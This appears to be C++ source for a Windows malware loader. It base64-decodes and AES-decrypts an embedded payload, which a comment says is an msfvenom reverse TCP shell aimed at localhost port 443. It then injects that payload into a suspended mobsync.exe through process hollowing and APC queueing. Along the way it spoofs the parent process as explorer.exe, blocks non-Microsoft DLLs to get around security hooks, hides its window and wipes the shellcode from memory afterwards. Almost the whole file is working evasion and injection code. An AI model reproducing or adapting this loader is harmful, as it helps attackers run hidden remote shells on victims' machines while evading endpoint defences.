#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(10000);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    shellcode = "OexHMBPZzhVXMsdoIod6Kt0xP+9n/Yt+oZMrKxT64SCh5XV/DUm5RJc6/lAj6mZDIQptH+tqUhVJaSi5kcdphEq6PjuqLV3OUsI9lbh9FCg5fxbhedlvLkiHl3RhdFGsZW9OBC70pM/wlJ+XEr5I7K5/sB1DXs4Hdp27Fy6yi406csaVudccj3q+645j01i4uRidBZuLwM2HGKp905mAAzW+FnC5VAdbR5OTsqfyRME43c/gy6MdiqkkQHA+aGvBi+7eGf/6L9nOIVeeG1nmHi8NgVTR+j4kkGBbYXP5H5rDeeBFkoQxZONnIr+ZvtFL4uXB857jk2RrMYtaWmgZFEQrs0cv7QNoOVkCZZ6OohDWZ10ke9TzEwz8RVOZXhmOzxOlIVCThbIEowBTfnjWojbUgGBl4HhdAuKE/hKuX/+1oat4zKfQDo/Gwk0iVi0bOKAgos2lDWQXaQt7H21TtfWLw7Yuz0/FzKfNhDa5eIUV+X/+rmYCNSnYgwOD3c27Ko8lbk+Y25Rtjx2XOFCfO/YSRRlCpuJ+1n6HbtJbDnco2JZAaIZjZg9lMx09/z6UmCUlkvYXCSNdhLLsEmYkBrr7JEzTQFDfUyFl89A2/f9GW9Mxv1LR6gnDfM95duYJhV8WXlPq0OWgrVSE6rz6TS0ByUXRA4KyeX9OIqYTBAl239LjJRDIJ4/V1DHp8J3gz5EPU1pK3ITyp5/e4hYALsWr9JRO0/DqGLGlzTpKsQUu8VlKiSgyARRmcA62MAjR7BfYxA6if9RHdB+Oi09/ppd7NM9LQVHf/mmtvnEGFy0SP2GGXMyKV1WBbL9POwGQBMgHQd7ImKD1vvX73nIZcHMWkmO2Bc780tuqXs71kNikCs8S0AY7s+jngq9PcR7dW3SSjy2CsAF3TDVVmq+xuuhpzkjb/1VJM/JUwolAFSc4AF+OLEh1vyjFy+/FIrTo4UpWTtVbHo8Isj3MdwQwo7VLQCNMtXk6yDVA2KjTqNVqtrtMyG3I3Ps2vmHbCEEGVi87QpoqUAd16eUNj7G2v1+eaQMWCuJMv4ufFCBrw9IHozPMuJLFSx+tP7YT1/d4AWoKygq1kShpS69ykKKKCWqKLSLiRPNPKkVMIYnrjaSXHfUx65ThtlwB/B6e75HXfCvSCxtPbfK5I85g5Xmptq6+iaxEMlDpdCnUx7vpIR9+M8x+gW8BHmQ58LkX4Te5LFrwrwlAhlepzyo3v1IWVA==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = {0xce,0x2d,0xd8,0x55,0xc8,0xb7,0x80,0x63,0xf7,0xdb,0xe7,0x00,0x7f,0x14,0x57,0x4c,0x7e,0x9e,0xcb,0x7b,0x25,0xc5,0x84,0xa1,0x7d,0xdb,0x83,0xa2,0x88,0x70,0x0b,0xfc};
    uint8_t iv[16] = {0xce,0x3a,0x38,0xe7,0x31,0x7b,0x49,0x27,0xc8,0x58,0x2b,0x43,0x3d,0xa6,0x12,0x7f};
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered);
    return 0;
}

